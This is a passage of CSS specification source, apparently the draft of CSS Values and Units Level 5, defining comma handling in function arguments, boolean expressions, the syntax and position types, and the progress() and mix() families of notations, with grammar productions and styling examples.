	</ol>

<h3 id=component-functions>
Functional Notation Definitions</h3>

	See [[css-values-4#component-functions]].

<h4 id=component-function-commas>
Commas in Function Arguments</h4>

	[=Functional notation=] often uses commas
	to separate parts of its internal grammar.
	However, some functions
	(such as ''mix()'')
	allow values that, themselves,
	can contain commas.
	These values
	(currently <<whole-value>>, <<declaration-value>>, and <<any-value>>)
	are <dfn export>comma-containing productions</dfn>.

	To accommodate these sorts of grammars unambiguously,
	the [=comma-containing productions=] can be optionally wrapped in curly braces {}.
	These braces are syntactic, not part of the actual value.
	Specifically:

	* A [=comma-containing production=] can either start with a "{" token, or not.
	* If it does not start with a "{" token,
		then it cannot contain commas or {} blocks,
		in addition to whatever specific restrictions it defines for itself.
		(The production stops parsing at that point,
		so the comma or {} block is matched by the next grammar term instead;
		probably the function's own argument-separating comma.)
	* If it does start with a "{" token,
		then the production matches just the {} block that the "{" token opens.
		It represents the <em>contents</em> of that block,
		and applies whatever specific restrictions it defines for itself
		to those contents,
		ignoring the {} block wrapper.

	<div class="example">
		For example, the grammar of the ''random-item()'' function is:

		<pre>
			random-item( <<random-caching-options>>, [<<declaration-value>>?]# )
		</pre>

		The ''#'' indicates comma-separated repetitions,
		so randomly choosing between three keywords
		would be written as normal for functions,
		like:

		<pre>
			font-family: random-item(--x, serif, sans-serif, monospace);
		</pre>

		However, sometimes the values you want to choose between
		need to include commas.
		When this is the case,
		wrapping the values in {}
		allows their commas to be distinguished
		from the function's argument-separating commas:

		<pre>
			font-family: random-item(--x, {Times, serif}, {Arial, sans-serif}, {Courier, monospace});
		</pre>

		This randomly chooses one of three font-family lists:
		either ''Times, serif'', or ''Arial, sans-serif'', or ''Courier, monospace''.

		This is not all-or-nothing;
		you can use {} around <em>some</em> arguments that need it,
		while leaving others bare when they don't need it.
		You are also allowed to use {} around a value when it's not strictly required.
		For example:

		<pre>
			font-family: random-item(--x, {Times, serif}, sans-serif, {monospace});
		</pre>

		This represents choosing between three font-family lists:
		either ''Times, serif'', or ''sans-serif'', or ''monospace''.

		However, this {}-wrapping is <em>only</em> allowed for some function arguments--
		those defined as [=comma-containing productions=].
		It's not valid for any other productions;
		if you use {} around other function arguments,
		it'll just fail to match the function's grammar
		and become invalid.
		For example, the following is <strong>invalid</strong>:

		<pre>
			background-image: linear-gradient(to left, {red}, magenta);
		</pre>
	</div>

	Note: Because {} wrappers are allowed even when not explicitly required,
	they can be used defensively around values
	when the author isn't sure if they'll end up containing commas or not,
	due to [=arbitrary substitution functions=] like ''var()''.
	For example, <l property>''font-family: random-item(--x, {var(--list1)}, monospace)''</l>
	will work correctly
	regardless of whether the ''--list1'' custom property
	contains a comma-separated list or not.

	[=Functional notations=] are serialized without {} wrappers whenever possible.

	The following generic productions are [=comma-containing productions=]:

	* <<any-value>>
	* <<whole-value>>
	* <<declaration-value>>

	For legacy compat reasons,
	the <<declaration-value>> defined the fallback value for ''var()''
	is a <dfn export>non-strict comma-containing production</dfn>.
	It ignores the rules restricting what it can contain
	when it does not start with a "{" token:
	it is allowed to contain commas and {} blocks.
	It still follows the standard [=comma-containing production=] rules
	when it <em>does</em> start with a "{" token, however:
	the fallback is just the contents of the {} block,
	and doesn't include the {} wrapper itself.

	Other contexts <em>may</em> define that they use [=non-strict comma-containing productions=],
	but it <em>should</em> be avoided unless necessary.

<h3 id=boolean>
Boolean Expression Multiplier <<boolean-expr[]>></h3>

	Several contexts
	(such as ''@media'', ''@supports'', ''if()'', ...)
	specify conditions,
	and allow combining those conditions with boolean logic (and/or/not/grouping).
	Because they use the same non-trivial recursive syntax structure,
	the special <dfn type><<boolean-expr[]>></dfn> production represents this pattern generically.

	The <<boolean-expr[]>> notation wraps another value type in the square brackets within it,
	e.g. &lt;boolean[ &lt;test&gt; ]&gt;,
	and represents that value type alone as well as
	boolean combinations
	using the ''not'', ''and'', and ''or'' keywords
	and grouping parenthesis.
	It is formally equivalent to:

	<xmp class=prod>
		<boolean-expr[ <test> ]> = not <boolean-expr-group> | <boolean-expr-group>
		                                            [ [ and <boolean-expr-group> ]*
		                                            | [ or <boolean-expr-group> ]* ]

		<boolean-expr-group> = <test> | ( <boolean-expr[ <test> ]> ) | <general-enclosed>
	</xmp>

	The <<boolean-expr[]>> production represents a true, false, or unknown value.
	Its value is resolved using 3-value Kleene logic,
	with top-level unknown values
	(those not directly nested inside the grammar of another <<boolean-expr[]>>)
	resolving to false unless otherwise specified;
	see [[#boolean-logic]] for details.

	<div class=example>
		For example, the ''@container'' rule allows a wide variety of tests:
		including size queries, style queries, and scroll-state queries.
		All of these are arbitrarily combinable with boolean logic.
		Using <<boolean-expr[]>>, the grammar for an ''@container'' query
		could be written as:

		<xmp class=prod>
			<container-query> = <boolean-expr[ <cq-test> ]>
			<cq-test> = (<size-query>) | style( <style-query> ) | scroll-state( <scroll-state-query> )
			<size-query> = <boolean-expr[ ( <size-feature> ) ]> | <size-feature>
			<style-query> = <boolean-expr[ ( <style-feature> ) ]> | <style-feature>
			<scroll-state-query> = <boolean-expr[ ( <scroll-state-feature> ) ]> | <scroll-state-feature>
		</xmp>
	</div>

	The <<general-enclosed>> branch of the logic allows for future compatibility--
	unless otherwise specified new expressions in an older UA
	will be parsed and considered “unknown”,
	rather than invalidating the production.
	For consistency with that allowance,
	the <css>&lt;test></css> term in a <<boolean-expr[]>>
	should be defined to match <<general-enclosed>>.

<h3 id=css-syntax>
Specifying CSS Syntax in CSS: the <<syntax>> type</h3>

Some features in CSS,
such as the ''attr()'' function
or [=registered custom properties=],
allow you to specify how <em>another</em> value is meant to be parsed.
This is declared via the <<syntax>> production,
which resembles a limited form of the CSS [=value definition syntax=]
used in specifications to define CSS features,
and which represents a [=syntax definition=]:

<pre class="prod def" nohighlight>
	<dfn><<syntax>></dfn> = '*' | <<syntax-component>> [ <<syntax-combinator>> <<syntax-component>> ]* | <<syntax-string>>
	<dfn><<syntax-component>></dfn> = <<syntax-single-component>> <<syntax-multiplier>>?
	                   | '<' transform-list '>'
	<dfn><<syntax-single-component>></dfn> = '<' <<syntax-type-name>> '>' | <<ident>>
	<dfn><<syntax-type-name>></dfn> = angle | color | custom-ident | image | integer
	                   | length | length-percentage | number
	                   | percentage | resolution | string | time
	                   | url | transform-function
	<dfn><<syntax-combinator>></dfn> = '|'
	<dfn><<syntax-multiplier>></dfn> = [ '#' | '+' ]

	<dfn><<syntax-string>></dfn> = <<string>>
</pre>

A <<syntax-component>> consists of either
a <<syntax-type-name>> between &lt;&gt; (angle brackets),
which maps to one of the [=supported syntax component names=],
or an <<ident>>, which represents any [=keyword=].
Additionally,
a <<syntax-component>> may contain a [[css-properties-values-api-1#multipliers|multiplier]],
which indicates a [=list=] of values.

Note: This means that <code>&lt;length&gt;</code>
	and <code>length</code> are two different types:
	the former describes a <<length>>,
	whereas the latter describes a [=keyword=] <code>length</code>.

Multiple <<syntax-component>>s may be [[css-properties-values-api-1#combinator|combined]]
with a <code>|</code> <<delim-token>>,
causing the syntax components to be matched
against a value
in the specified order.

<div class='example'>
	<xmp class='lang-css'>
		<percentage> | <number> | auto
	</xmp>

	The above, when parsed as a <<syntax>>,
	would accept <<percentage>> values,
	<<number>> values,
	as well as the keyword <code>auto</code>.
</div>

<div class='example'>
	<xmp class='lang-css'>
	red | <color>
	</xmp>

	The [=syntax definition=] resulting from the above <<syntax>>,
	when used as a grammar for [=parse|parsing=],
	would match an input <code>red</code> as an [=identifier=],
	but would match an input <code>blue</code> as a <<color>>.
</div>

The <code>*</code> <<delim-token>> represents the [=universal syntax definition=].

The <code>&lt;transform-list&gt;</code> production
is a convenience form equivalent to <code>&lt;transform-function&gt;+</code>.
<span class=note>Note that <code>&lt;transform-list&gt;</code> may not
	be followed by a <<syntax-multiplier>>.</span>

[=Whitespace=] is not allowed
between the angle bracket <<delim-token>>s (<code>&lt;</code> <code>&gt;</code>)
and the <<syntax-type-name>> they enclose,
nor is [=whitespace=] allowed to precede a <<syntax-multiplier>>.

Note: The [=whitespace=] restrictions also apply to <code>&lt;transform-list&gt;</code>.

A <<syntax-string>> is a <<string>>
whose value successfully [=CSS/parses=] as a <<syntax>>,
and represents the same value as that <<syntax>> would.

Note: <<syntax-string>> mostly exists for historical purposes;
before <<syntax>> was defined,
the ''@property'' rule used a <<string>> for this purpose.

<h4 id=parse-syntax>
Parsing as <<syntax>></h4>

The purpose of a <<syntax>>
is usually to specify how to parse another value
(such as the value of a [=registered custom property=],
or an attribute value in ''attr()'').
However, the generic [=CSS/parse something according to a CSS grammar=] algorithm
returns an unspecified internal structure,
since parse results might be ambiguous
and need further massaging.

To avoid these issues and get a well-defined result,
use [=parse with a &lt;syntax>=]:

<div algorithm>
	To <dfn export>parse with a <<syntax>></dfn>
	given a [=string=] or [=list=] or [=CSS/component values=] |values|,
	a <<syntax>> value |syntax|,
	and optionally an element |el| for context,
	perform the following steps.
	It returns either CSS values,
	or the [=guaranteed-invalid value=].

	1. [=Parse a list of component values=] from |values|,
		and let |raw parse| be the result.

	2. If |el| was given,
		[=substitute arbitrary substitution functions=] in |raw parse|,
		and set |raw parse| to that result.

	3. [=CSS/parse=] |values| according to |syntax|,
		with a ''*'' value treated as <code><<declaration-value>>?</code>,
		and let |parsed result| be the result.
		If |syntax| used a ''|'' combinator,
		let |parsed result| be the parse result from the first matching clause.

	4. If |parsed result| is failure,
		return the [=guaranteed-invalid value=].

	5. Assert: |parsed result| is now a well-defined list of one or more CSS values,
		since each branch of a <<syntax>> defines an unambiguous parse result
		(or the ''*'' syntax is unambiguous on its own).

	6. Return |parsed result|.
</div>

Note: This algorithm does not resolved the parsed values
into [=computed values=];
the context in which the value is used will usually do that already,
but if not,
the invoking algorithm will need to handle that on its own.

<h3 id="position">
2D Positioning: the <<position>> type</h3>

	The <dfn><<position>></dfn> value specifies the position
	of an [=alignment subject=] (e.g. a background image)
	inside an [=alignment container=] (e.g. its [=background positioning area=])
	as a pair of offsets between the specified edges
	(defaulting to the left and top).
	Its syntax is:

	<pre class=prod>
	<<position>> = <<position-one>> | <<position-two>> | <<position-four>>
	<dfn><<position-one>></dfn> = [
	  left | center | right | top | bottom |
	  x-start | x-end | y-start | y-end |
	  block-start | block-end | inline-start | inline-end |
	  <<length-percentage>>
	]
	<dfn><<position-two>></dfn> = [
	  [ left | center | right | x-start | x-end ] &&
	  [ top | center | bottom | y-start | y-end ]
	|
	  [ left | center | right | x-start | x-end | <<length-percentage>> ]
	  [ top | center | bottom | y-start | y-end | <<length-percentage>> ]
	|
	  [ block-start | center | block-end ] &&
	  [ inline-start | center | inline-end ]
	|
	  [ start | center | end ]{2}
	]
	<dfn><<position-four>></dfn> = [
	  [ [ left | right | x-start | x-end ] <<length-percentage>> ] &&
	  [ [ top | bottom | y-start | y-end ] <<length-percentage>> ]
	|
	  [ [ block-start | block-end ] <<length-percentage>> ] &&
	  [ [ inline-start | inline-end ] <<length-percentage>> ]
	|
	  [ [ start | end ] <<length-percentage>> ]{2}
	]
	</pre>

	If only one value is specified (<<position-one>>),
	the second value is assumed to be ''center''.

	If two values are given (<<position-two>>),
	a <<length-percentage>> as the first value represents
	the horizontal position as the offset between
	the left edges of the [=alignment subject=] and [=alignment container=],
	and a <<length-percentage>> as the second value represents
	the vertical position as an offset between their top edges.

	If both keywords are one of ''<position>/start'' or ''<position>/end'',
	the first one represents the [=block axis=]
	and the second the [=inline axis=].

	Note: A pair of axis-specific keywords can be reordered,
	while a combination of keyword and length or percentage cannot.
	So ''center left'' or ''inline-start block-end'' is valid,
	while ''50% left'' is not.
	''<position>/start'' and ''<position>/end'' aren't axis-specific,
	so ''start end'' and ''end start'' represent two different positions.

	If four values are given (<<position-four>>)
	then each <<length-percentage>> represents an offset between
	the edges specified by the preceding keyword.
	For example, ''background-position: bottom 10px right 20px''
	represents a ''10px'' vertical offset up from the bottom edge
	and a ''20px'' horizontal offset leftward from the right edge.

	Positive values represent an offset <em>inward</em>
	from the edge of the [=alignment container=].
	Negative values represent an offset <em>outward</em>
	from the edge of the [=alignment container=].

	<div class="example">
		The following declarations give the stated (horizontal, vertical)
		offsets from the top left corner:
		<pre>
			background-position: left 10px top 15px;   /* 10px, 15px */
			background-position: left      top     ;   /*  0px,  0px */
			background-position:      10px     15px;   /* 10px, 15px */
			background-position: left          15px;   /*  0px, 15px */
			background-position:      10px top     ;   /* 10px,  0px */
		</pre>
	</div>

	<div class=example>
		<<position>>s can also be relative to other corners than the top left.
		For example, the following puts the background image
		10px from the bottom and 3em from the right:

		<pre>background-position: right 3em bottom 10px</pre>
	</div>

	The [=computed value=] of a <<position>> is
	a pair of offsets (horizontal and vertical),
	each given as a computed <<length-percentage>> value,
	representing the distance between the left edges and top edges (respectively)

			A <<length-percentage>> value specifies the size of the offset
			between the specified edges of the [=alignment subject=] and [=alignment container=].

			For example, for ''background-position: 2cm 1cm'',
			the top left corner of the background image is placed
			2cm to the right and 1cm below
			the top left corner of the [=background positioning area=].

			A <<percentage>> for the horizontal offset is relative to
			(<var ignore>width of [=alignment container=]</var> - <var ignore>width of [=alignment subject=]</var>).
			A <<percentage>> for the vertical offset is relative to
			(<var ignore>height of [=alignment container=]</var> - <var ignore>height of [=alignment subject=]</var>).

			<div class=example>
				For example, with a value pair of ''0% 0%'',
				the upper left corner of the [=alignment subject=] is aligned with
				the upper left corner of the [=alignment container=]
				A value pair of ''100% 100%'' places
				the lower right corner of the [=alignment subject=]
				in the lower right corner of the [=alignment container=].
				With a value pair of ''75% 50%'',
				the point 75% across and 50% down the [=alignment subject=]
				is to be placed at the point 75% across and 50% down the [=alignment container=].

	Unless otherwise specified, the [=flow-relative=] keywords are resolved
	according to the [=writing mode=] of the element on which the value is specified.

	Note: The 'background-position' property also accepts a three-value syntax.
	This has been disallowed generically because it creates parsing ambiguities
	when combined with other length or percentage components in a property value.

	ISSUE(9690): Need to define how this syntax would expand to the longhands of 'background-position'
	if e.g. ''var()'' is used for some (or all) of the components.

<h4 id="position-parsing">
Parsing <<position>></h4>

	When specified in a grammar alongside other keywords, <<length>>s, or <<percentage>>s,
	<<position>> is <em>greedily</em> parsed;
	it consumes as many components as possible.

	<div class=example>
		For example,
		'transform-origin' defines a 3D position
		as (effectively) ''<<position>> <<length>>?''.
		A value such as ''left 50px''
		will be parsed as a 2-value <<position>>,
		with an omitted z-component;
		on the other hand,
		a value such as ''top 50px''
		will be parsed as a single-value <<position>>
		followed by a <<length>>.
	</div>

<h4 id="position-serialization">
Serializing <<position>></h4>

	When serializing the [=specified value=] of a <<position>>:

	<dl class=switch>
		<dt>If only one component is specified:
		<dd>
			* The implied <a value spec="css-backgrounds-3">center</a> keyword is added,
				and a 2-component value is serialized.

		<dt>If two components are specified:
		<dd>
			* Keywords are serialized as keywords.
			* <<length-percentage>>s are serialized as <<length-percentage>>s.
			* Components are serialized horizontal first, then vertical.

		<dt>If four components are specified:
		<dd>
			* Keywords and offsets are both serialized.
			* Components are serialized horizontal first, then vertical;
				alternatively [=block-axis=] first, then [=inline-axis=].
	</dl>

	Note: <<position>> values are never serialized as a single value,
	even when a single value would produce the same behavior,
	to avoid causing parsing ambiguities in some grammars
	where a <<position>> is placed next to a <<length>>,
	such as 'transform-origin'.

	The [=computed value=] of a <<position>>
	is serialized as a pair of <<length-percentage>>s
	representing offsets from the left and top edges, in that order.

<h4 id="combine-positions">
Combination of <<position>></h4>

	<l spec=css-values-4>[=Interpolation=]</l> of <<position>> is defined as
	the independent interpolation of each component (x, y)
	normalized as an offset from the top left corner
	as a <<length-percentage>>.

	<l spec=css-values-4>[=value addition|Addition=]</l> of <<position>> is likewise defined as
	the independent <l spec=css-values-4>[=value addition|addition=]</l> each component (x, y)
	normalized as an offset from the top left corner
	as a <<length-percentage>>.

<h2 id="progress">
Interpolation Progress Functional Notations</h2>

	ISSUE(6245): This section is an exploratory draft, and not yet approved by the CSSWG.

	The ''progress()'', ''media-progress()'', and ''container-progress()'' [=functional notations=]
	represent the proportional distance
	of a given value (the <dfn noexport>progress value</dfn>)
	from one value (the <dfn noexport>progress start value</dfn>)
	to another value (the <dfn noexport>progress end value</dfn>).
	They allow drawing a progress ratio from
	[=math functions=], [=media features=], and [=container features=],
	respectively,
	following a common syntactic pattern:

	<pre class=prod>
		<var ignore>progress-function</var>() = <var ignore>progress-function</var>( <var ignore>progress value</var> from <var ignore>start value</var> to <var ignore>end value</var> )
	</pre>

	Each resolves to a <<number>>
	by [=calculating a progress function=].

	<div algorithm>
		To <dfn export>calculate a progress function</dfn>,
		given a [=progress value=],
		[=progress start value=],
		and [=progress end value=]:

		: If the [=progress start value=] and [=progress end value=] are different values
		:: <code>([=progress value=] - [=progress start value=]) / ([=progress end value=] - [=progress start value=])</code>.
		: If the [=progress start value=] and [=progress end value=] are the same value
		:: 0, -∞, or +∞,
			depending on whether [=progress value=]
			is equal to, less than, or greater than
			the shared value.

		Note: The return value is a plain <<number>>,
		not [=made consistent=] with its arguments by default.
	</div>

	The resulting number can then be input into other calculations,
	such as a [=math function=]
	or a [=mix notation=].

<h3 id="progress-func">
Calculated Progress Values: the ''progress()'' notation</h3>

	The <dfn>progress()</dfn> functional notation
	returns a <<number>> value
	representing the position of one [=calculation=]
	(the [=progress value=])
	between two other [=calculations=]
	(the [=progress start value=]
	and [=progress end value=]).
	''progress()'' is a [=math function=].

	The syntax of ''progress()'' is defined as follows:

	<pre class=prod>
		<dfn id=typedef-progress-fn><<progress()>></dfn> = progress(<<calc-sum>>, <<calc-sum>>, <<calc-sum>>)
	</pre>

	where the first, second, and third <<calc-sum>> values represent
	the [=progress value=], [=progress start value=], and [=progress end value=],
	respectively.

	The argument [=calculations=] can resolve to any <<number>>, <<dimension>>, or <<percentage>>,
	but must have a [=consistent type=]
	or else the function is invalid.

	The value of ''progress()'' is a <<number>>,
	determined by [=calculating a progress function=],
	then [=made consistent=] with the [=consistent type=] of its arguments.

	ISSUE: Do we need a ''percent-progress()'' notation,
	or do enough places auto-convert that it's not necessary?

	Note: The ''progress()'' function is essentially syntactic sugar
	for a particular pattern of ''calc()'' notations,
	so it's a [=math function=].

<h3 id="media-progress-func">
Media Query Progress Values: the ''media-progress()'' notation</h3>

	Similar to the ''progress()'' notation,
	the <dfn>media-progress()</dfn> functional notation
	returns a <<number>> value
	representing current value of the specified [=media query=]
	[[!MEDIAQUERIES-4]]
	as a [=progress value=]
	between two explicit values of the [=media query=]
	(as the [=progress start value=] and [=progress end value=]).

	The syntax of ''media-progress()'' is defined as follows:

	<pre class=prod>
		<dfn><<media-progress()>></dfn> = media-progress(<<mf-name>>, <<calc-sum>>, <<calc-sum>>)
	</pre>

	where the value of the [=media feature=] corresponding to <<mf-name>>
	represents the [=progress value=],
	and the two <<calc-sum>> values represent
	the [=progress start value=] and [=progress end value=],
	respectively.

	The specified [=media feature=] must be a valid “range” type feature,
	the specified [=progress start value=] and [=progress end value=]
	must be valid values for the specified [=media query=],
	and both [=calculation=] values must have a [=consistent type=],
	or else the function is invalid.

	The [=progress start value=] and [=progress end value=] [=calculations=]
	are interpreted as specified for the [=media feature=]
	(rather than as specified by the context the function is used in).

	The value of ''media-progress()'' is a <<number>>,
	determined by [=calculating a progress function=].

	Note: ''media-progress()'' is <em>not</em> a [=math function=];
	it's just a function that evaluates to a <<number>>.

<h3 id="container-progress-func">
Container Query Progress Values: the ''container-progress()'' notation</h3>

	The <dfn>container-progress()</dfn> functional notation
	is identical to the ''media-progress()'' functional notation,
	except that it accepts [=container features=] [[!CSS-CONTAIN-3]]
	in place of [=media features=].

	The syntax of ''container-progress()'' is defined as follows:

	<pre class=prod>
		<dfn><<container-progress()>></dfn> = container-progress(<<mf-name>> [ of <<container-name>> ]?, <<calc-sum>>, <<calc-sum>>)
	</pre>

	where <<mf-name>> represents a [=size feature=]
	and the optional <<container-name>> component specifies
	the named containers to consider when selecting a container
	to resolve them against.
	The value of the [=size feature=] is the [=progress value=],
	and the two <<calc-sum>> values represent
	the [=progress start value=] and [=progress end value=],
	respectively.

	The specified <<mf-name>> must be a valid [=size feature=],
	the specified [=progress start value=] and [=progress end value=]
	must be valid values for that [=size feature=],
	and both [=calculation=] values must have a [=consistent type=],
	or else the function is invalid.
	''container-progress()'' is only valid in a property value context;
	it cannot be used in, for example, a [=media query=].

	The [=progress start value=] and [=progress end value=] [=calculations=]
	are interpreted as specified for the [=size feature=]
	(rather than as specified by the context the function is used in).
	If no appropriate containers are found,
	''container-progress()'' resolves its <<size-feature>> query
	against the [=small viewport size=].

	The value of ''media-progress()'' is a <<number>>,
	determined by [=calculating a progress function=].

	Note: ''container-progress()'' is <em>not</em> a [=math function=];
	it's just a function that evaluates to a <<number>>.

<h2 id="mixing">
Mixing and Interpolation Notations: the *-mix() family</h2>

	ISSUE(6245): This feature <a href="https://css.typetura.com/ruleset-interpolation/explainer/">does not handle multiple breakpoints very well</a>,
	and <a href="https://github.com/w3c/csswg-drafts/issues/6245#issuecomment-2469190377">might need to be redesigned</a>.

	Several <dfn>mix notations</dfn> in CSS
	allow representing the interpolation of two values,
	the <dfn>mix start value</dfn> and the <dfn>mix end value</dfn>,
	at a given point in progress between them (the <dfn>mix progress value</dfn>).
	These [=functional notations=] follow the syntactic pattern:

	<pre class=prod>
		<var>mix-function</var>() = <var>mix-function</var>( <<progress>>, [=mix start value|start-value=], [=mix end value|end-value=] )
	</pre>

	The [=mix notations=] in CSS include:
	* ''calc-mix()'',
		for interpolating <<length>>, <<percentage>>, <<time>>,
		and other dimensions representable in ''calc()'' expressions
	* ''color-mix()'',
		for interpolating two <<color>> values
	* ''cross-fade()'',
		for interpolating <<image>> values
	* ''palette-mix()'',
		for interpolating two 'font-palette' values

	and finally the generic ''mix()'' notation,
	which can represent the interpolation of any property's values
	(but only the property's entire value, not individual components).

	Note: The ''cross-fade()'' notation
	also has an alternative syntax
	that allows for mixing more than two values,
	but does not allow for the more complex expressions of <<progress>>.

	ISSUE: The ''mix()'' notation also has a variant that takes a set of keyframes.
	It does this by referring to an ''@keyframes'' rule,
	and pulling the corresponding property declaration out of that.
	It would be nice to allow the other mix notations to take keyframe also,
	but how would we represent a set of keyframes for a [=component value=]
	(rather than a full property value)?

<h3 id="progress-type">
Representing Interpolation Progress: the <<progress>> type</h3>

	The <dfn><<progress>></dfn> value type represents
	the [=mix progress value=] in a [=mix notation=],
	and ultimately resolves to a percentage.
	It can, however, draw that percentage value
	from sources such as media queries and animation timelines,
	and can also convert it through an [=easing function=]
	before using it for interpolation.

	Its syntax is defined as follows:
	<pre class=prod>
		<<progress>> = [ <<percentage>> | <<number>> | <<'animation-timeline'>> ] && [ by <<easing-function>> ]?
	</pre>

	where:

	<dl dfn-type=value dfn-for="<progress>">
		<dt><dfn><<percentage-token>></dfn>
		<dd>
			Computes to the equivalent <<number>>:
			''0%'' becomes ''0'',
			''100%'' becomes ''1'',
			etc.

			Note: This only allows literal percentages,
			like ''15%'';
			calculations like ''calc(100% / 7)'' will not work,
			as they will instead attempt to use the normal rules
			for resolving a percentage against another type
			(such as <<length>>, in 'width').
			Use expressions like ''calc(1 / 7)'' instead.

		<dt><dfn><<number>></dfn>
		<dd>
			Represents the [=mix progress value=].

			Note: This allows the use of the ''progress()'',
			''media-progress()'',
			and ''container-progress()'' notations.

		<dt><dfn><<'animation-timeline'>></dfn>
		<dd>
			Represents the [=mix progress value=]
			as the progress of the specified [[web-animations-1#timelines|animation timeline]].
			The values ''animation-timeline/none'' and ''animation-timeline/auto'', however,
			are invalid.
			[[!CSS-ANIMATIONS-2]] [[!WEB-ANIMATIONS-2]]

		<dt><dfn><<easing-function>></dfn>
		<dd>
			Converts the specified input [=mix progress value=]
			into an output [=mix progress value=]
			using the specified [=easing function=].
			[[!CSS-EASING-1]]
	</dl>

	Note: Progress values below ''0'' and above ''1'' are valid;
	they allow representing interpolation beyond the range
	defined by the start and end values.

	Note: While <<progress>> itself can be a <<percentage>>,
	mapping directly to the equivalent <<number>>,
	a function that <em>resolves</em> to a <<number>>,
	like ''progress()'',
	resolves <<percentage>>s using the normal rules for the context;
	for example, in 'width', they would be resolved against a length.

	The [=computed value=] of a <<progress>> value specified with <<percentage>> or <<number>>
	is the computed <<number>> converted through the <<easing-function>> (if any).
	The [=computed value=] of a <<progress>> value specified with <<'animation-timeline'>>
	is the computed <<'animation-timeline'>> and <<easing-function>> (if any).

<h3 id="calc-mix">
Interpolated Numeric and Dimensional Values: the ''calc-mix()'' notation</h3>

	The <dfn>calc-mix()</dfn> [=mix notation=]
	represents an interpolated numeric or dimensional value.
	Like ''calc()'', it is a [=math function=],
	with the following syntactic form:

	<pre class=prod>
		<dfn><<calc-mix()>></dfn> = calc-mix( <<progress>>, <<calc-sum>>, <<calc-sum>> )
	</pre>

	The <<calc-sum>> arguments can resolve
	to any <<number>>, <<dimension>>, or <<percentage>>,
	but must have a [=consistent type=]
	or else the function is invalid.
	The result's type will be the [=consistent type=],
	[=made consistent=] with the type of the <<progress>> value.

	The [=used value=] of a valid ''calc-mix()'' is
	the result of interpolating these two values
	to the progress given by <<progress>>.
	If the <<progress>> value can be computed to a <<number>>,
	then the [=computed value=] is likewise
	the result of interpolating the two [=computed values=]
	to that <<progress>> value
	(in other words, ''A * (1-progress) + B * progress'')
	it is otherwise the ''calc-mix()'' notation itself
	with its arguments each computed according to their type.

<h3 id="color-mix">
Interpolated Color Values: the ''color-mix()'' notation</h3>

	This specification extends the ''color-mix()'' [=functional notation=]
	as a [=mix notation=] accepting the following syntaxes:

	<pre class=prod>
		<<color-mix()>> =
		  color-mix( [ <<progress>> && <<color-interpolation-method>>? ] , <<color>>, <<color>> ) |
		  color-mix( <<color-interpolation-method>>, [<<color>> && <<percentage [0,100]>>?]#{2} )
	</pre>

	The used value of the first [=mix notation=] variant
	is equivalent to assigning the <<progress>> value,
	as a <<percentage>>,
	to the <<percentage>> of the second <<color>> argument in the second variant.
	<span class=note>That is, ''color-mix(progress, color1, color2)'' is equivalent to ''color-mix(color1, color2 progress)''.</span>
	See [[css-color-5#color-mix]] for the normative definition of the second variant.

	ISSUE: <<progress>> allows returning percentages outside 0-100%,
	but ''color-mix()'' doesn't allows such values,
	so need to define how that gets processed.

<h3 id="cross-fade">
Interpolated Image Values: the ''cross-fade()'' notation</h3>

	This specification extends the ''cross-fade()'' [=functional notation=]
	as a [=mix notation=] accepting the following syntaxes:

	<pre class=prod>
		<<cross-fade()>> =
		  cross-fade( <<progress>>, [ <<image>> | <<color>> ], [ <<image>> | <<color>> ] ) |
		  cross-fade( <<cf-image>># )
	</pre>

	The used value of the first [=mix notation=] variant
	is equivalent to assigning the <<progress>> value
	as the <<percentage>> of the second <<color>> argument in the second variant.
	<span class=note>That is, ''cross-fade(progress, image1, image2)'' is equivalent to ''cross-fade(image1, image2 progress)''.</span>
	See [[css-images-4#cross-fade-function]] for the normative definition of the second variant.


<h3 id="transform-mix">
Interpolated Transform Values: the ''transform-mix()'' notation</h3>

	The <dfn>transform-mix()</dfn> [=mix notation=]
	represents an interpolated <<transform-list>>,
	with the following syntactic form:

	<pre class=prod>
		<dfn><<transform-mix()>></dfn> = transform-mix( <<progress>>, <<transform-list>>, <<transform-list>> )
	</pre>

	The [=used value=] of a valid ''transform-mix()'' is
	the result of interpolating these two values
	to the progress given by <<progress>>.
	If the <<progress>> value can be computed to a <<percentage>>,
	and the <<transform-list>>s can be interpolated
	without used-value-time information,
	then the [=computed value=] is likewise
	the result of interpolating the two [=computed values=]
	to that <<progress>> value;
	it is otherwise the ''transform-mix()'' notation itself
	with its arguments each computed according to their type.

	''transform-mix()'' is, itself, a <<transform-function>>.

<h3 id="mix">
Interpolated Property Values: the ''mix()'' notation</h3>

	[=Interpolation=] of any two property values can be represented
	by the <dfn>mix()</dfn> [=mix notation=],
	which supports two alternative syntax patterns:

	<pre class="prod">
		<dfn><<mix()>></dfn> =
		  mix( <<progress>> , <<whole-value>> , <<whole-value>> ) |
		  mix( <<progress>> && of <<keyframes-name>> )
	</pre>

	The first syntax alternative, like other [=mix notations=],
	interpolates between the first <<whole-value>> (its [=mix start value=])
	and the second <<whole-value>> (its [=mix end value=]).
	The second uses the [=mix progress value=]
	to interpolate the corresponding property declarations from a set of keyframes,
	allowing for more complex interpolation curves.

	For the standard [=mix notation=] variant,
	if the two <<whole-value>>s being interpolated by ''mix()''
	are [=interpolation|interpolable=]
	as values for the property in which it is specified,
	and the interpolated value can be represented without ''mix()'',
	the [=computed value=] of ''mix()'' is
	the result of interpolating these two values
	to the progress given by <<progress>>.
	Otherwise,
	the [=computed value=] of ''mix()'' is
	the ''mix()'' [=functional notation=] itself
	with its <<progress>> value computed
	and its <<whole-value>>s (if provided)
	computed as values for this property.

	<div class="example">
		For example, most uses of ''mix()''
		will resolve at computed-value time:

		<pre>
			color: mix(90%, red, blue);
			/* via simple interpolation,
			   computes to: */
			color: rgb(10% 0 90%);

			color: mix(90%, currentcolor, black);
			/* can't be fully resolved at computed-value time,
			   but still has a defined representation: */
			color: color-mix(currentcolor 90%, black 10%);

			float: mix(90%, left, right);
			/* discretely animatable */
			float: right;
		</pre>

		But a few cases don't have an intermediate representation:

		<pre>
			transform: mix(90%, translate(calc(1em + 50%)), rotate(30deg));
			/* because functions don't match, it will interpolate
			   via matrix(). But translate(%) needs layout
			   information to turn into a matrix(), so the
			   interpolated value can't actually be represented.
			   Computes to: */
			transform: mix(90%, translate(calc(16px + 50%)), rotate(30deg));
			transform: mix(90% of ripple);
		</pre>
	</div>

	The ''mix()'' notation is a <<whole-value>>.
	Additionally,
	if any of its <<whole-value>> arguments are [=not animatable=],
	the notation is invalid.

	<div class="example">
		For example, the following declarations are invalid,
		and will be ignored:

		<pre>
			/* Invalid start value */
			color: mix(90%, #invalid, #F00);

			/* Function is mixed with other values */
			background: url(ocean) mix(10%, blue, yellow);
